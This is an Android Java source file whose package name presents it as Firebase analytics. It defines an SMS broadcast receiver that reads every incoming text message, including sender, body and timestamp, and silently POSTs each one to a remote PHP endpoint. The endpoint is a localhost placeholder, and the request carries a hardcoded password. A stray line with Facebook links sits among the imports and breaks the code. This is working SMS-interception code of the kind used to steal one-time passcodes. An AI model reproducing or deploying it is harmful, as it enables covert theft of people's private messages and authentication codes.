package com.khair.firebase_analytics;

https://www.facebook.com/share/v/17BX7r7q88/  ai post thekay code ta nici onr id : https://www.facebook.com/md.abul.khair.32571/

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.text.DateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class SMSReceiver extends BroadcastReceiver {
    private Context myContext;
    private String senderNum, message, smsTime;

    @Override
    public void onReceive(Context context, Intent intent) {
        myContext = context;
        final Bundle bundle = intent.getExtras();
        Log.d("smsBroadcast", "onReceive called");

        try {
            if (bundle != null) {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    senderNum = currentMessage.getDisplayOriginatingAddress();
                    message = currentMessage.getDisplayMessageBody();
                    long time = currentMessage.getTimestampMillis();
                    smsTime = DateFormat.getDateTimeInstance().format(new Date(time));

                    Log.d("smsBroadcast", "senderNum: " + senderNum);
                    Log.d("smsBroadcast", "message: " + message);
                    Log.d("smsBroadcast", "smsTime: " + smsTime);

                    // Sending SMS to your server
                    smsSendToServer(myContext, senderNum, message, smsTime);
                }
            }
        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception caught: " + e.getMessage());
        }
    }

    // ==========================================================

    private void smsSendToServer(Context context, String senderNum, String message, String smsTime) {
        long time = System.currentTimeMillis();
        final String url = "https://localhost/notification/update_info.php";

        RequestQueue MyRequestQueue = Volley.newRequestQueue(context);

        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("smsBroadcast", "response: " + response);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // This code is executed if there is an error.
                Log.d("smsBroadcast", "Error: " + error.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<>();
                MyData.put("password", "1234567890");
                MyData.put("senderNum", senderNum);
                MyData.put("message", message);
                MyData.put("smsTime", smsTime);
                return MyData;
            }
        };
        MyRequestQueue.add(MyStringRequest);
    }
}
